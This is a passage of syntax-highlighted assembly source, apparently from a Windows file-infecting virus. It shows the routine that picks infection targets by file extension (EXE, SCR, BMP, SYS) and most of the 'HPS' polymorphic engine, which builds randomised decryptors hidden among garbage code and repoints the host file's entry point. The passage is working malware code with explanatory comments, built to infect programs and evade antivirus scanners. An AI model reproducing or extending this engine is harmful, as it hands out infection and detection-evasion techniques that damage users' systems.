                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_here</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Copy path+filename to our buffer in upper case and check extension</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">check_filename</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;Now look at filename</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">target_filename</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;while copying it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MAX_PATH</span><span class="sc0">                        </span><span class="sc1">;into our buffer</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">                                     
</span><span class="sc5">look_name</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"a"</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">not_lowcase</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"z"</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">not_lowcase</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"a"</span><span class="sc4">-</span><span class="sc3">"A"</span><span class="sc0">                          </span><span class="sc1">;Convert to uppercase</span><span class="sc0">
</span><span class="sc5">not_lowcase</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_name</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">"\"
</span><span class="sc0">                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">look_loop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">look_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">look_name</span><span class="sc0">
</span><span class="sc5">invalid_name</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">end_name</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000005h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"EXE."</span><span class="sc0">                          </span><span class="sc1">;Is a .EXE file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">valid_file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"RCS."</span><span class="sc0">                          </span><span class="sc1">;A screen saver?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">valid_file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"PMB."</span><span class="sc0">                          </span><span class="sc1">;May be a .BMP file</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">valid_file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"SYS."</span><span class="sc0">                          </span><span class="sc1">;BMP hidden as .SYS?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">invalid_name</span><span class="sc0">
</span><span class="sc5">valid_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Here comes the HPS polymorphic encryption engine, some of its features are:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Size of operand modes: Byte, Word and Dword</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Decrypts in both directions, from lowest address to highest or starting</span><span class="sc0">
</span><span class="sc1">; at the end to the lowest address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Indexing modes:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       [reg]</span><span class="sc0">
</span><span class="sc1">;       [reg+imm]</span><span class="sc0">
</span><span class="sc1">;       [reg+reg]</span><span class="sc0">
</span><span class="sc1">;       [reg+reg+imm]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Operations used to decrypt:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       INC</span><span class="sc0">
</span><span class="sc1">;       DEC</span><span class="sc0">
</span><span class="sc1">;       NOT</span><span class="sc0">
</span><span class="sc1">;       ADD</span><span class="sc0">
</span><span class="sc1">;       SUB</span><span class="sc0">
</span><span class="sc1">;       XOR</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Garbage generators:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       MOV reg,imm </span><span class="sc0">
</span><span class="sc1">;       MOV reg,reg </span><span class="sc0">
</span><span class="sc1">;       ADD reg,imm </span><span class="sc0">
</span><span class="sc1">;       ADC reg,imm </span><span class="sc0">
</span><span class="sc1">;       SUB reg,imm </span><span class="sc0">
</span><span class="sc1">;       SBB reg,imm </span><span class="sc0">
</span><span class="sc1">;       AND reg,imm </span><span class="sc0">
</span><span class="sc1">;       NOT reg,imm </span><span class="sc0">
</span><span class="sc1">;       XOR reg,imm </span><span class="sc0">
</span><span class="sc1">;       OR reg,imm </span><span class="sc0">
</span><span class="sc1">;       PUSH/Garbage/POP</span><span class="sc0">
</span><span class="sc1">;       CALL</span><span class="sc0">
</span><span class="sc1">;       JMP</span><span class="sc0">
</span><span class="sc1">;       Conditional jumps</span><span class="sc0">
</span><span class="sc1">;       MOVZX reg,reg</span><span class="sc0">
</span><span class="sc1">;       One byte instructions</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The engine uses a table to store the state of each register at any time</span><span class="sc0">
</span><span class="sc1">; while working</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The engine never generates each decryptor step in the same order, like</span><span class="sc0">
</span><span class="sc1">; this:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Load index register</span><span class="sc0">
</span><span class="sc1">;       Load counter register</span><span class="sc0">
</span><span class="sc1">;       Decrypt</span><span class="sc0">
</span><span class="sc1">;       Modify index register</span><span class="sc0">
</span><span class="sc1">;       Modify counter register</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This steps are generated inside subrotuines that can appear at any</span><span class="sc0">
</span><span class="sc1">; position in the decryptor code, like this:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Decrypt</span><span class="sc0">
</span><span class="sc1">;       Load counter register</span><span class="sc0">
</span><span class="sc1">;       Modify index register</span><span class="sc0">
</span><span class="sc1">;       Load index register</span><span class="sc0">
</span><span class="sc1">;       Modify counter register</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The garbage code generator can be called by itself in a recursive way,</span><span class="sc0">
</span><span class="sc1">; so it can generate complex sequences of nosense-looking code</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The resulting code is always hard to follow</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;This kind of code is always hard to understand, i hope the comments are</span><span class="sc0">
</span><span class="sc1">;enough to guide you through this poly engine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate one decryptor</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">mutate</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc1">;Keep direction flag clear</span><span class="sc0">

                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc1">;The engine uses a table that stores the state of each reg</span><span class="sc0">
                </span><span class="sc1">;Register table structure is as follows:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; 00h - Byte - Register mask</span><span class="sc0">
                </span><span class="sc1">; 01h - Byte - Register flags</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;So now lets clear the state field before start generating</span><span class="sc0">
                </span><span class="sc1">;the polymorphic code</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_startup</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_regs</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">loop_init_regs</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_init_regs</span><span class="sc0">

                </span><span class="sc1">;Another table used by the engine holds the address of each</span><span class="sc0">
                </span><span class="sc1">;generator, the structure of this table is:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; 00h - DWORD - Address of generator</span><span class="sc0">
                </span><span class="sc1">; 04h - DWORD - Address of generated subroutine or</span><span class="sc0">
                </span><span class="sc1">;               00000000h if not yet generated</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Lets mark each entry as not yet generated</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">style_table</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">clear_style</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">clear_style</span><span class="sc0">

                </span><span class="sc1">;Clear displacement over displacement field</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp2disp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                                
                </span><span class="sc1">;Now choose the register that the engine will use as</span><span class="sc0">
                </span><span class="sc1">;index register</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_INDEX</span><span class="sc0">

                </span><span class="sc1">;Choose also wich register will be used as counter</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_IS_COUNTER</span><span class="sc0">

                </span><span class="sc1">;The engine generates the following indexing modes:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; DECRYPT [reg]</span><span class="sc0">
                </span><span class="sc1">; DECRYPT [reg+imm]</span><span class="sc0">
                </span><span class="sc1">; DECRYPT [reg+reg]</span><span class="sc0">
                </span><span class="sc1">; DECRYPT [reg+reg+imm]</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;This code determines if we are going to use any displacement</span><span class="sc0">
                </span><span class="sc1">;and if so, it gets a random one</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_disp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000FFFFFh</span><span class="sc0">
</span><span class="sc5">ok_disp</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Dercrypt instructions such as ADD, SUB or XOR need a</span><span class="sc0">
                </span><span class="sc1">;key to use as second operand, choose it here</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypt_key</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;This field holds some flags:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; CRYPT_DIRECTION Decrypt up-&gt;down or up&lt;-down</span><span class="sc0">
                </span><span class="sc1">; CRYPT_CMPCTR    </span><span class="sc0">
                </span><span class="sc1">; CRYPT_CDIR      </span><span class="sc0">
                </span><span class="sc1">; CRYPT_SIMPLEX   </span><span class="sc0">
                </span><span class="sc1">; CRYPT_COMPLEX   </span><span class="sc0">
                                  
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;The counter register needs to be loaded with the size</span><span class="sc0">
                </span><span class="sc1">;of the encrypted code divided by the size of the</span><span class="sc0">
                </span><span class="sc1">;decrypt instruction (01h for byte, 02h for word or</span><span class="sc0">
                </span><span class="sc1">;04h for double word)</span><span class="sc0">
                </span><span class="sc1">;This routine determines this size</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_size_ok</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_size_ok</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">get_size_ok</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;At any time EDI points to the place where the engine have</span><span class="sc0">
                </span><span class="sc1">;to generate the next decryptor instruction</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">mem_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">mem_size</span><span class="sc4">+</span><span class="sc5">inf_size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;Put some random data at the begining, this will never</span><span class="sc0">
                </span><span class="sc1">;be executed so note that it is "random data" and not</span><span class="sc0">
                </span><span class="sc1">;"random code"</span><span class="sc0">
                </span><span class="sc1">;Keep in mind this diference in next comments</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">

                </span><span class="sc1">;Generated decryptors are just polymorphic versions of the</span><span class="sc0">
                </span><span class="sc1">;following pseudocode:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; Generate decryptor steps, each step into a different</span><span class="sc0">
                </span><span class="sc1">; subroutine and in random order each time</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; Generate calls to each subrotuine trying to hide this</span><span class="sc0">
                </span><span class="sc1">; calls inside lots of random code</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;As result generated code will never repeat any sequence</span><span class="sc0">
                </span><span class="sc1">;of actions, for example: The routine that loads the index</span><span class="sc0">
                </span><span class="sc1">;register can be generated at the begining of the decryptor</span><span class="sc0">
                </span><span class="sc1">;or at the end, but it will be called always in the first</span><span class="sc0">
                </span><span class="sc1">;call instruction</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Steps into first pseudocode are:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; Generate code that loads the index register</span><span class="sc0">
                </span><span class="sc1">; Generate code that loads the counter register</span><span class="sc0">
                </span><span class="sc1">; Generate decryp instruction</span><span class="sc0">
                </span><span class="sc1">; Increment/Decrement index register in its proper size</span><span class="sc0">
                </span><span class="sc1">; Increment/Decrement counter register</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Now start generating one subroutine for each of the above</span><span class="sc0">
                </span><span class="sc1">;steps</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">

</span><span class="sc5">do_subroutine</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc1">;Get a random entry in the steps table, remember that each</span><span class="sc0">
                </span><span class="sc1">;entry have the following structure:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; 00h - DWORD - Address of generator</span><span class="sc0">
                </span><span class="sc1">; 04h - DWORD - Address of generated subroutine or</span><span class="sc0">
                </span><span class="sc1">;               00000000h if not yet generated</span><span class="sc0">

</span><span class="sc5">routine_done</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">style_table</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Already generated?</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">routine_done</span><span class="sc0">

                </span><span class="sc1">;Generate subrotuine inside some random code, so pseudocode</span><span class="sc0">
                </span><span class="sc1">;for each one will look like this:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; Random code</span><span class="sc0">
                </span><span class="sc1">; Decryptor step (load index, load counter, decrypt ...)</span><span class="sc0">
                </span><span class="sc1">; Random code</span><span class="sc0">
                </span><span class="sc1">; RET</span><span class="sc0">
                </span><span class="sc1">; Random data</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Note that "random code" will also contain calls, jumps and</span><span class="sc0">
                </span><span class="sc1">;lots of no-sense shit that will really hide the code of the</span><span class="sc0">
                </span><span class="sc1">;decryptor step</span><span class="sc0">
                </span><span class="sc1">;The "random data" will let some space betwen each subrotuine</span><span class="sc0">
                </span><span class="sc1">;(size and data are random)</span><span class="sc0">
                </span><span class="sc1">;This code will also save the entry-point of each generated</span><span class="sc0">
                </span><span class="sc1">;subroutine, so we can call them later</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">

                </span><span class="sc1">;Generate next subroutine</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">do_subroutine</span><span class="sc0">

                </span><span class="sc1">;Well, i said that generated decryptors are just polymorphic</span><span class="sc0">
                </span><span class="sc1">;versions of the following pseudocode</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; Generate decryptor steps, each step into a different</span><span class="sc0">
                </span><span class="sc1">; subroutine and in random order each time</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; Generate calls to each subrotuine trying to hide this</span><span class="sc0">
                </span><span class="sc1">; calls inside lots of random code</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Its time to work on the second step</span><span class="sc0">

                </span><span class="sc1">;This is the entry-point to the polymorphic decryptor, </span><span class="sc0">
                </span><span class="sc1">;save it, we will point the file entry-point here later on</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">entry_point</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;The entry-point of each generated subroutine have been</span><span class="sc0">
                </span><span class="sc1">;stored into the steps table</span><span class="sc0">
                </span><span class="sc1">;Generate a CALL instruction for each table entry, but</span><span class="sc0">
                </span><span class="sc1">;hide the it inside some random code, like this:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; Random code</span><span class="sc0">
                </span><span class="sc1">; CALL instruction to the decryptor step subroutine</span><span class="sc0">
